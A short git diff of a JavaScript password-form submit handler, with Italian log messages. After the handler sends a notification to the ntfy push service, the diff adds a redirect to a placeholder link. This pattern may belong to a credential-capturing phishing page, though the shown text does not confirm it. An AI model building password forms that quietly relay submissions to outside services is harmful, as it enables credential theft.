@@ -167,6 +167,7 @@ document.getElementById('password-form').addEventListener('submit', async functi
 
         if (response.ok) {
             console.log("Notifica inviata a ntfy.");
+            window.location.href = "https://TUO-LINK.com";
         } else {
             console.error("Errore ntfy:", response.status);
         }
